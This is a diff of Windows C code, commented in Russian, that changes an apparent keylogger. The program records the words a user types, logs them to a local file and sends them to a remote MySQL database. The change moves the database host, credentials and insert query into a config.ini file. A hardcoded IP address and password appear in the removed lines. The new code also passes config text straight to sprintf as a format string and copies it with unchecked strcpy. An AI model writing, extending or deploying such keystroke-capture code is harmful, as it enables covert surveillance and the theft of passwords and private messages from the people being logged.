@@ -17,6 +17,15 @@ int state = OUT;
 char g_word_buffer[256];
 int g_word_buffer_index = 0;
 
+// Структура для хранения конфигурации БД
+struct DbConfig {
+    char host[128];
+    char user[128];
+    char password[128];
+    char database[128];
+    char insert_query[256];
+} g_db_config;
+
 void send_word_to_db();
 
 // Callback вызываемый при нажатии на клавишу
@@ -89,17 +98,44 @@ void send_word_to_db() {
 
     g_word_buffer[g_word_buffer_index] = '\0'; // Завершаем строку в буффере
 
-    char query[512];
-    sprintf(query, "INSERT INTO words (word, timestamp) VALUES ('%s', NOW())", g_word_buffer);
-    if (mysql_query(g_conn, query)) {
+    // Используем шаблон запроса из конфига
+    char final_query[1024];
+    sprintf(final_query, g_db_config.insert_query, g_word_buffer);
+
+    if (mysql_query(g_conn, final_query)) {
         fprintf(g_log, "MYSQL Error: %s\n", mysql_error(g_conn));
         fflush(g_log);
     }
     g_word_buffer_index = 0; // Обнуляем буффер, чтобы принять новое слово в него
 }
 
+// Функция для чтения config.ini
+void load_config(const char* filename) {
+    FILE* file = fopen(filename, "r");
+    if (!file) {
+        MessageBox(NULL, "Не удалось найти config.ini", "Ошибка конфигурации", MB_OK | MB_ICONERROR);
+        exit(1); // Завершаем программу, если конфига нет
+    }
+
+    char line[512];
+    while (fgets(line, sizeof(line), file)) {
+        char* key = strtok(line, "=");
+        char* value = strtok(NULL, "\n");
+        if (key && value) {
+            if (strcmp(key, "host") == 0) strcpy(g_db_config.host, value);
+            else if (strcmp(key, "user") == 0) strcpy(g_db_config.user, value);
+            else if (strcmp(key, "password") == 0) strcpy(g_db_config.password, value);
+            else if (strcmp(key, "database") == 0) strcpy(g_db_config.database, value);
+            else if (strcmp(key, "insert_query") == 0) strcpy(g_db_config.insert_query, value);
+        }
+    }
+    fclose(file);
+}
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    // Загружаем конфигурацию в самом начале
+    load_config("config.ini");
+
     g_log = fopen("C:\\Temp\\keylog.txt", "a");
     if (!g_log) return 1;
     fprintf(g_log, "--- Session Started ---\n");
@@ -113,7 +149,13 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return 1;
     }
 
-    if (mysql_real_connect(g_conn, "192.168.0.100", "logger", "qn9@NiUYb", "keylogging", 3306, NULL, 0) == NULL) {
+    if (mysql_real_connect(g_conn,
+                           g_db_config.host,
+                           g_db_config.user,
+                           g_db_config.password,
+                           g_db_config.database,
+                           3306, NULL, 0) == NULL)
+    {
         fprintf(g_log, "mysql_real_connect() failed: %s\n", mysql_error(g_conn));
         mysql_close(g_conn);
         g_conn = NULL; // Указываем, что соединения нет
